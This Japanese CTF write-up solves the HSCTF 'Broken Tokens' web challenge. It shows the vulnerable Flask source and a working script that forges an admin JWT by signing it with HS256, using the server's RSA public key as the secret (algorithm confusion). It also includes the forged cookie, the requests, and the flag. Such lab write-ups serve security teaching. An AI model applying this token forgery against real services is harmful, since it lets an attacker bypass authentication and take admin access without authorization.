# Broken Tokens

```
web

I made a login page, is it really secure?
https://broken-tokens.web.hsctf.com/
Note: If you receive an "Internal Server Error" (HTTP Status Code 500),
that means that your cookie is incorrect.
Author: hmmm
```

## Solution

![1](https://user-images.githubusercontent.com/47602064/83934499-885ae480-a7ec-11ea-8b88-9866f82e21a3.png)

問題のページに移動するとloginページが表示されました。

そこにはリンクで`publickey.pem`もありました。

```pem
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtnREuAwK7M/jWZdSVNfN
4m+kX0rqakI6KIR/qzT/Fv7hfC5vg9UJgEaAGOfexmoDMBYTLRSHnQ9EYjF6bkCh
w+NVQCqsvy9psZVnjUHQ6QfVUdyrUcsOuRoMMaEBYp+qCegDY5Vp65Wzk05qXfvK
LJK9apOo0pPgD7fdOhpqwzejxgWxUgYvMqkGQS2aCC51ePvC6edkStNxovoDFvXk
uG69/7jEqs2k2pk5mI66MR+2U46ub8hPUk7WA6zTGHhIMuxny+7ivxYIXCqEbZGV
YhOuubXfAPrVN2UpL4YBvtfmHZMmjp2j39PEqxXU70kTk96xq3WhnYm46HhciyIz
zQIDAQAB
-----END PUBLIC KEY-----
```

試しにそのままloginしてみると`guest`でloginが出来たそうです。

![2](https://user-images.githubusercontent.com/47602064/83934571-16cf6600-a7ed-11ea-9533-00f20e687552.png)

おそらく`admin`でloginをしなければいけなそうと考えられます。

<br>

`login`した時の通信を見てみます。

```http
GET / HTTP/1.1
Host: broken-tokens.web.hsctf.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: ja,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://broken-tokens.web.hsctf.com/
Connection: close
Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJhdXRoIjoiZ3Vlc3QifQ.e3UX6vGuTGHWouov4s5HuKn6B5zbe0ZjxwHCB_OQlX_TcntJuj89x0RDi8gQi88TMoXSFN-qnFUQxillB_nD5ErrVZKL8HI5Ah_iQBX1xfu097H2xT3LAhDEceq4HDEQY-iC4TVSxMGM0AS_ItsVLBIrxk8tapcANvCW_KnO3mEFwfQOD64YHtapSZJ-kKjdN19lgdI_g-2nNI83P6TlgLtZ8vo1BB1zt_8b4UECSiPb67YCsrCYIIsABq5UyxSwgUpZsM6oxW0k1c4NbaUTnUWURG2qWDVw56svRQETU3YjO59AMj67n9r9Y9NJ9FBlpHQ60Ck-mfL5JcmFE9sgVw
Upgrade-Insecure-Requests: 1
```

すると`Cookie`に`auth`が入っています。

これをデコードして中身を見てみます。

```
$ echo eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9 | base64 -d
{"typ":"JWT","alg":"RS256"}
$ echo eyJhdXRoIjoiZ3Vlc3QifQ | base64 -d
{"auth":"guest"}
```

これで`auth`に`guest`が入っていたことがわかります。

<br>

次に`main.py`というソースコードを見てみます。

```python
import jwt
import base64
import os
import hashlib
from flask import Flask, render_template, make_response, request, redirect
app = Flask(__name__)
FLAG = os.getenv("FLAG")
PASSWORD = os.getenv("PASSWORD")
with open("privatekey.pem", "r") as f:
	PRIVATE_KEY = f.read()
with open("publickey.pem", "r") as f:
	PUBLIC_KEY = f.read()

@app.route('/', methods=['GET', 'POST'])
def index():
	if request.method == "POST":
		resp = make_response(redirect("/"))
		if request.form["action"] == "Login":
			if request.form["username"] == "admin" and request.form["password"] == PASSWORD:
				auth = jwt.encode({"auth": "admin"}, PRIVATE_KEY, algorithm="RS256")
			else:
				auth = jwt.encode({"auth": "guest"}, PRIVATE_KEY, algorithm="RS256")
			resp.set_cookie("auth", auth)
		else:
			resp.delete_cookie("auth")
		
		return resp
	else:
		auth = request.cookies.get("auth")
		if auth is None:
			logged_in = False
			admin = False
		else:
			logged_in = True
			admin = jwt.decode(auth, PUBLIC_KEY)["auth"] == "admin"
		resp = make_response(
			render_template("index.html", logged_in=logged_in, admin=admin, flag=FLAG)
		)
	return resp

@app.route("/publickey.pem")
def public_key():
	with open("./publickey.pem", "r") as f:
		resp = make_response(f.read())
		resp.mimetype = 'text/plain'
		return resp

if __name__ == "__main__":
	app.run()
```

今回注目するのは以下の部分と思われます。

```python
admin = jwt.decode(auth, PUBLIC_KEY)["auth"] == "admin"
```

flagを得るには`/`に`GET`でアクセスして`auth`に`admin`がセットされていれば、`FLAG`が表示されそうです。

<br>

今回は公開鍵が既にわかっているのでこれを使います。

そして`jwt`は古い`pyjwt==0.4.3`を使用します。


```python
#!/usr/bin/python3

import jwt

#pyjwt==0.4.3

pubkey = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtnREuAwK7M/jWZdSVNfN
4m+kX0rqakI6KIR/qzT/Fv7hfC5vg9UJgEaAGOfexmoDMBYTLRSHnQ9EYjF6bkCh
w+NVQCqsvy9psZVnjUHQ6QfVUdyrUcsOuRoMMaEBYp+qCegDY5Vp65Wzk05qXfvK
LJK9apOo0pPgD7fdOhpqwzejxgWxUgYvMqkGQS2aCC51ePvC6edkStNxovoDFvXk
uG69/7jEqs2k2pk5mI66MR+2U46ub8hPUk7WA6zTGHhIMuxny+7ivxYIXCqEbZGV
YhOuubXfAPrVN2UpL4YBvtfmHZMmjp2j39PEqxXU70kTk96xq3WhnYm46HhciyIz
zQIDAQAB
-----END PUBLIC KEY-----
"""

cookie = jwt.encode({"auth": "admin"}, pubkey, algorithm="HS256")

print(cookie.decode())
```

```
$ python3 solve.py 
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoiYWRtaW4ifQ.MfoiS9XkQHMOw2Y6uQJrw0gM2NUfGYM-1Sz-SzKvad4
```

これで生成されました。

上手く生成できているか試しにデコードしてみます。

```
$ echo eyJhdXRoIjoiYWRtaW4ifQ | base64 -d
{"auth":"admin"}
```

これで`admin`が埋め込められていることが確認できます。

<br>

後は`admin`を埋め込んだ`cookie`をセットして送信させます。

```http
GET / HTTP/1.1
Host: broken-tokens.web.hsctf.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: ja,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://broken-tokens.web.hsctf.com/
Connection: close
Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoiYWRtaW4ifQ.MfoiS9XkQHMOw2Y6uQJrw0gM2NUfGYM-1Sz-SzKvad4
Upgrade-Insecure-Requests: 1
```

```http
HTTP/1.1 200 OK
			
<!DOCTYPE html>
<html>
	<head>
  
  main id="content">
			<div>Logged in as admin</div>
			<div id="flag">The flag is flag{1n53cur3_tok3n5_5474212}</div>
		</main>
	</body>
</html>
```

![3](https://user-images.githubusercontent.com/47602064/83937052-53f32280-a804-11ea-9e9c-e38760b66e25.png)

するとflagが表示されました。

<br><br>

## FLAG: flag{1n53cur3_tok3n5_5474212}
